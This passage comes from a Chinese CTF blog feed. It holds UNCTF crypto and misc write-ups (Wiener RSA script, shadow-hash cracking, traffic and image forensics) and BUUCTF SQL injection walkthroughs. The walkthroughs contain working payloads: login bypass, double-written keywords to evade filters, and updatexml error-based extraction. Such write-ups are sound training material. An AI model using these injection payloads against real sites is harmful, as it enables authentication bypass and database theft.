class="token punctuation">)</span>                <span class="token keyword">if</span> t <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>s <span class="token operator">+</span> t<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hacked!"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> d    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    e <span class="token operator">=</span> <span class="token number">18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781</span>    n <span class="token operator">=</span> <span class="token number">147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701</span>    c <span class="token operator">=</span> <span class="token number">140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934</span>    d <span class="token operator">=</span> wiener_hack<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h4><p>在010editor中打开附件，末尾处发现一个b站的URL，打开在评论区看到了flag</p><h4 id="爷的历险记"><a href="#爷的历险记" class="headerlink" title="爷的历险记"></a>爷的历险记</h4><p>这个有两个解，一个可能是预期解，还有一个不是预期解的。<br>先说预期解，就是玩游戏，先开宝箱，将base64编码解出，输入密码得到百度大法这个魔法攻击，然后就开宝箱，不过最多只能买到两个hint，第一个hint是<code>爷经常在自己书房的花盆下做奇奇怪怪的事</code><br>另一个hint是<code>爷看了自己的存档，rpgsave到底是什么呢</code><br>最后的hint就是flag，但是没钱买，搜索<code>rpgsave</code>找到在线修改的网站，<br><a href="https://www.saveeditonline.com/">在线网站</a><br>将文件传入，修改gold，最后就可以买flag了。<br><img src="https://s3.ax1x.com/2020/11/21/D1d6Mt.png" alt="m0re" loading="lazy"><br>非预期解，在<code>www/data/Items.json</code>中搜索unctf<br>找到flag<br><img src="https://s3.ax1x.com/2020/11/21/D1dLZT.png" alt="m0re" loading="lazy"></p><h4 id="撕坏的二维码"><a href="#撕坏的二维码" class="headerlink" title="撕坏的二维码"></a>撕坏的二维码</h4><p>打开文件得到一张残缺的二维码，右上角的定位符缺少一个，所以补上一个定位符就可以扫描出来结果了。<br><img src="https://s3.ax1x.com/2020/11/18/DnAkGT.jpg" alt="m0re" loading="lazy"></p><h4 id="被删除的flag"><a href="#被删除的flag" class="headerlink" title="被删除的flag"></a>被删除的flag</h4><p>这个就是拖到010editor中搜索unctf直接出flag</p><h4 id="阴阳人编码"><a href="#阴阳人编码" class="headerlink" title="阴阳人编码"></a>阴阳人编码</h4><p>下载后得到txt文件，里面都是<code>就这.</code>、<code>不会吧！</code>、<code>就这¿</code><br>它与Ook编码的格式很像，所以改成和Ook编码格式相同的类型。<br>在记事本中替换，<br><code>就这.</code>换成<code>.</code><br><code>不会吧！</code>换成<code>！</code><br><code>就这¿</code>换成<code>¿</code><br>最后进行网站在线解码得到flag<br><img src="https://s3.ax1x.com/2020/11/18/DneqgK.png" alt="m0re" loading="lazy"></p><h4 id="倒影"><a href="#倒影" class="headerlink" title="倒影"></a>倒影</h4><p>exe文件无法运行，用010editor打开，看文件头，发现是张图片的格式，往下翻，在最后发现了base64编码。<br><img src="https://s3.ax1x.com/2020/11/18/DnmbIs.png" alt="m0re" loading="lazy"><br>复制出来，解码得到<br><img src="https://s3.ax1x.com/2020/11/18/Dnnuee.png" alt="m0re" loading="lazy"><br>看最后，B405，是504B反过来了，所以先将它进行转换，反着输出<br>python代码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'0000000000B4000000A500100010000000006050B405106D6A9EA24E5767106D7AD58AC22940106D7AD58AC229400081001000000000000200A0478747E27616C666000000000000000200000000000000420080000000910000005297D4535E1555E5C90000801000A000F32010B405B4ECC7E9889EDF1BA30C6FF71836EBCFE9A735EFD6E501CE14109505827764B69DC37C6E2E478747E27616C66600000080000000910000005297D4535E1555E5C90000801000A04030B405'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>得到结果</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token number">504B03040A00010800009C5E5551E5354D79250000001900000008000000666C61672E747874E2E6C73CD96B46772850590141EC105E6DFE537A9EFCBE63817FF6C03AB1FDE9889E7CCE4B504B01023F000A00010800009C5E5551E5354D792500000019000000080024000000000000002000000000000000666C61672E7478740A002000000000000100180004922CA85DA7D60104922CA85DA7D6017675E42AE9A6D601504B050600000000010001005A0000004B0000000000</span></code></pre><p><img src="https://s3.ax1x.com/2020/11/18/Dnug3t.png" alt="m0re" loading="lazy"><br>解压需要密码，没有任何提示这里的密码，所以尝试爆破。<br><img src="https://s3.ax1x.com/2020/11/18/DnKVbD.png" alt="DnKVbD.png" loading="lazy"><br>密码<code>658745</code>得到flag</p><h4 id="你能破解我的密码吗"><a href="#你能破解我的密码吗" class="headerlink" title="你能破解我的密码吗"></a>你能破解我的密码吗</h4><p>这个就是个破解shadow文件的内容的，首先想到的是使用John破解就可以了。<br>一条命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">john --show shadow</code></pre><p>用户名是guguguguji的，这个是有密码的。</p><pre class="language-bash" data-language="bash"><code class="language-bash">guguguguji:<span class="token variable">$1</span><span class="token variable">$AH</span><span class="token variable">$xtjky</span>.3kppbU27tR0SDJT.:18556:0:99999:7:::</code></pre><p>可以直接在线网站搜索查询。<a href="https://cmd5.com/">cmd5</a><br><img src="https://s3.ax1x.com/2020/11/18/DnMopn.png" alt="m0re" loading="lazy"><br>然后进行MD5加密就是flag</p><h4 id="mouse-click"><a href="#mouse-click" class="headerlink" title="mouse_click"></a>mouse_click</h4><p>下载得到流量包，分析一下，全是USB流量<br><img src="https://s3.ax1x.com/2020/11/21/D10GB6.png" alt="m0re" loading="lazy"><br>鼠标流量分析，之前总结过，直接套路解</p><pre class="language-bash" data-language="bash"><code class="language-bash">tshark -r mouse_click.pcapng -T fields -e usb.capdata <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^\s*$/d'</span> <span class="token operator">></span> usbdata.txt</code></pre><p>提取出来没有长度不一的，所以就不用进行二次处理了。<br>加冒号，转坐标。<br>之后直接画图就可以了。<br>最后得到<br><img src="https://s3.ax1x.com/2020/11/21/D1DokT.png" alt="m0re" loading="lazy"><br>看的不方便，垂直反转一下。<br><code>unctf&#123;U5BC@P&#125;</code></p><h4 id="EZ-IMAGE"><a href="#EZ-IMAGE" class="headerlink" title="EZ_IMAGE"></a>EZ_IMAGE</h4><p>一共225个图片，225开方得到15，所以是15x15<br>montage拼图，</p><pre class="language-bash" data-language="bash"><code class="language-bash">montage *.jpg -tile 15x15 -geometry +0+0 <span class="token number">1</span>.jpg</code></pre><p>得到<br><img src="https://s3.ax1x.com/2020/11/21/D1stsA.jpg" alt="m0re" loading="lazy"><br>再使用gaps还原，具体安装方法之前总结过，直接百度即可找到。</p><pre class="language-bash" data-language="bash"><code class="language-bash">gaps --image<span class="token operator">=</span><span class="token number">1</span>.jpg --population<span class="token operator">=</span><span class="token number">500</span> --size<span class="token operator">=</span><span class="token number">60</span> --save</code></pre><p><img src="https://s3.ax1x.com/2020/11/21/D14oAH.jpg" alt="m0re" loading="lazy"></p><h4 id="网络深处"><a href="#网络深处" class="headerlink" title="网络深处"></a>网络深处</h4><p>附件下载后得到</p><pre class="language-bash" data-language="bash"><code class="language-bash">题目内故事纯属虚构，完全架空。你是一名学生，你在夜间路过一个电话亭，一个人鬼鬼祟祟的进入电话亭拨通了一个电话又拿出手机录了音，他反常的行为引起了你的注意，他走后你决定去电话亭看看。电话亭里又一个皱巴巴的纸条，上面写着一串数字：，这很可能是刚才的人不小心丢在这里的，这显然不是电话号码，这使你更加好奇，你决定看看他拨的是什么电话号码。你按了一下重拨键，想看看他拨打的电话号码，但是这个公用电话的屏幕坏了，之传出了一段拨号音，你迅速挂掉电话又重拨了一次并录下了拨号音。回到寝室的你像弄清楚字条的含义，看来只有得到他拨打的电话才能搞明白字条的含义了。得到电话号码以后，你拨通了他，里面传出一段杂音，一筹莫展的你决定将这件奇怪的事情告诉警察。<span class="token comment"># 电话号码就是压缩包密码</span></code></pre><p>使用<code>dtmf2num.exe</code>提取按键音。<br><img src="https://s3.ax1x.com/2020/11/21/D1IMdg.png" alt="m0re" loading="lazy"><br>得到密码<br>解开压缩包</p><pre class="language-bash" data-language="bash"><code class="language-bash">你是一名警察，前段时间有一个学生上报了一个可疑事件，一个人鬼鬼祟祟的打了一通电话又录了音，离开时不小心落下一个意义不明的字条。这名学生给了你一段拨号音，拨号音得到的电话号码，以及那个奇怪的字条。你拨通了那段电话并录了音，里面传出一段刺耳的奇怪录音，录音中可能就有关于字条破解方式的提示，你决定找到字条的秘密。破解了字条以后，得到一个似曾相识的字符串。<span class="token comment"># 得到的字符串就是flag，flag格式为flag&#123;&#125;</span>你认得这字符串，是某种处理过的字符串，解码以后出现了一个熟悉的单词，看来有必要查查这个人了。<span class="token comment"># 不能再往下出了，有缘再见吧</span></code></pre><p>还有一个音频，拖进 <code>audacity</code><br>打开频谱图，得到<br><img src="https://s3.ax1x.com/2020/11/21/D1I7lt.png" alt="m0re" loading="lazy"><br>我的和别人的有点不一样，，别人的可以直接看到是<code>tupper</code><br>可以搜索一下关键字，根据大师傅的wp找到一篇文章<br><a href="https://www.bbsmax.com/A/QW5Yw13Gzm/">用Tupper自我指涉公式造图</a></p><p>k就是第一段描述中的那一串神秘字符串。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">""" Copyright (c) 2012, 2013 The PyPedia Project, http://www.pypedia.com &lt;br>All rights reserved.  Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:   # Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. # Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.  http://www.opensource.org/licenses/BSD-2-Clause """</span>  __pypdoc__ <span class="token operator">=</span> <span class="token triple-quoted-string string">""" Method: Tupper_self_referential_formula Link: http://www.pypedia.com/index.php/Tupper_self_referential_formula Retrieve date: Tue, 11 Mar 2014 03:15:49 +0200  Plots the [http://en.wikipedia.org/wiki/Tupper's_self-referential_formula Tupper's_self-referential_formula]: : &lt;math>&#123;1\over 2&#125; &lt; \left\lfloor \mathrm&#123;mod&#125;\left(\left\lfloor &#123;y \over 17&#125; \right\rfloor 2^&#123;-17 \lfloor x \rfloor - \mathrm&#123;mod&#125;(\lfloor y\rfloor, 17)&#125;,2\right)\right\rfloor&lt;/math>  The plot is the very same formula that generates the plot.   [[Category:Validated]] [[Category:Algorithms]] [[Category:Math]] [[Category:Inequalities]]  """</span>  <span class="token keyword">def</span> <span class="token function">Tupper_self_referential_formula</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         k <span class="token operator">=</span> <span class="token number">636806841748368750477720528895492611039728818913495104112781919263174040060359776171712496606031373211949881779178924464798852002228370294736546700438210687486178492208471812570216381077341015321904079977773352308159585335376746026882907466893864815887274158732965185737372992697108862362061582646638841733361046086053127284900532658885220569350253383469047741742686730128763680253048883638446528421760929131783980278391556912893405214464624884824555647881352300550360161429758833657243131238478311219915449171358359616665570429230738621272988581871</span>         <span class="token comment">#love yiran</span>      <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>         d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">17</span> <span class="token operator">*</span> x<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>y <span class="token operator">%</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         e <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> x<span class="token operator">*</span>y<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token operator">-</span>d<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> d <span class="token keyword">else</span> <span class="token number">1</span>         f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">/</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">/</span> e<span class="token punctuation">)</span>         g <span class="token operator">=</span> f <span class="token operator">%</span> <span class="token number">2</span>         <span class="token keyword">return</span> <span class="token number">0.5</span> <span class="token operator">&lt;</span> g      <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>k<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span> k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         line <span class="token operator">=</span> <span class="token string">""</span>         <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">if</span> f<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>                 line <span class="token operator">+=</span> <span class="token string">"@"</span>             <span class="token keyword">else</span><span class="token punctuation">:</span>                 line <span class="token operator">+=</span> <span class="token string">" "</span>         <span class="token keyword">print</span> line  <span class="token comment">#Method name =Tupper_self_referential_formula()</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># print __pypdoc__</span>      returned <span class="token operator">=</span> Tupper_self_referential_formula<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> returned<span class="token punctuation">:</span>         <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>returned<span class="token punctuation">)</span></code></pre><p>找到脚本，画图<br><img src="https://s3.ax1x.com/2020/11/21/D1TWPH.png" alt="m0re" loading="lazy"><br>g和9傻傻分不清楚，试一下就好了。</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记——计划第一周</title>
      <link href="/posts/699fce3c/"/>
      <url>/posts/699fce3c/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大二上的计划第一次给自己交作业。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>做SQL注入的题目有点拉垮，老老实实刷刷题吧。</p><h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p>极客大挑战的题目——来源BUUCTF<br>测试一下，先看一下闭合符号是什么。</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>'</code></pre><p><img src="https://img-blog.csdnimg.cn/20201109103031987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>双引号闭合，<br>首先尝试万能密码</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token string">"or"</span><span class="token operator">=</span>"a<span class="token string">'='</span>a</code></pre><p>登录成功<br><img src="https://img-blog.csdnimg.cn/20201109103846693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>想先fuzz一下，结果太多请求不返回内容了，只能手动测</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020110911032282.png#pic_center" alt="m0re" loading="lazy"><br>然后只剩下<code>1#</code>可知<code>union</code>和<code>select</code>被过滤了。尝试双写绕过<br><img src="https://img-blog.csdnimg.cn/20201109110515634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后呢提示列数错误<br>所以这个时候已经注入成功了，只是查询语句出错了，列数我这里设置的1，进行尝试就可以知道列数为3<br><img src="https://img-blog.csdnimg.cn/20201109110715721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后进行爆数据库名。</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span></code></pre><p>数据库名是<code>geek</code><br>查询表名<br><img src="https://img-blog.csdnimg.cn/20201109111038651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>过滤from，过滤好多。<br>重新设置payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201109111400408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>查到<code>ctf</code>表和<code>geek</code>表都有可能，先看<code>geek</code>表</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>frfromom <span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span>whwhereere table_schema<span class="token operator">=</span><span class="token string">"geek"</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201109111811619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>不急着查列，先看看ctf表中是什么，<br><img src="https://img-blog.csdnimg.cn/20201109111930687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>这个就是都看一看，省去不必要的步骤<br>直接查字段了</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>frfromom <span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span>whwhereere table_name<span class="token operator">=</span><span class="token string">"Flag"</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201109112130568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>查看内容就可以了</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>ctf<span class="token punctuation">.</span>Flag<span class="token punctuation">)</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201109112332458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><p>进行测试，测试闭合符号和一些常见过滤。<br>首先测试闭合符号，输入<code>a&#39;</code>来进行测试<br><img src="https://img-blog.csdnimg.cn/20201110235140960.png#pic_center" alt="m0re" loading="lazy"><br>发现报错，然后进行fuzz测试。发现<br><img src="https://img-blog.csdnimg.cn/20201111093928452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>过滤许多，<code>=</code>和<code>空格</code>等，联合查询的方式被过滤了，<code>order by</code>也行不通，所以换个方法。报错注入进行注入。<br>所以空格可以使用<code>()</code>绕过，<code>=</code>可以用<code>like</code><br>而且抓包会发现这个题目是get方式请求的<br>这里我测试使用的是<code>updatexml</code>也可以使用另一种，<code>extractvalue</code><br>还有就是尝试进行注入数据库名的时候，发现and和or也被过滤。无法使用<br>，会“被逮到”！<br>然后就使用<code>^</code>形成异或，来连接SQL语句。<br>注入数据库名的payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>a<span class="token string">'^updatexml('</span><span class="token operator">~</span><span class="token string">',concat(0x7e,(select(database()))),'</span><span class="token operator">~</span>'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre><p><code>%23</code>是<code>#</code>的URL编码<br>注出数据库名为<code>geek</code><br>接下来就是模版，</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>a<span class="token string">'^updatexml('</span><span class="token operator">~</span><span class="token string">',concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('</span>geek<span class="token string">')))),'</span><span class="token operator">~</span>'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201111133035461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>过程顺利，继续进行</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>a<span class="token string">'^updatexml('</span><span class="token operator">~</span><span class="token string">',concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('</span>H4rDsq1<span class="token string">')))),'</span><span class="token operator">~</span><span class="token string">')%23#id,username,password?username=admin&amp;password=a'</span><span class="token operator">^</span>updatexml<span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment">#~flag&#123;3ae14e93-a584-402e-bb93-c5'</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201111161033386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>最后的语句只有一半flag，这是<code>updatexml</code>只能一次最多显示32位，<br>所以需要使用left和right来控制输出。</p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>a<span class="token string">'^updatexml('</span><span class="token operator">~</span><span class="token string">',concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))),'</span><span class="token operator">~</span><span class="token string">')%23?username=admin&amp;password=a'</span><span class="token operator">^</span>updatexml<span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre><p>得到后面的flag<img 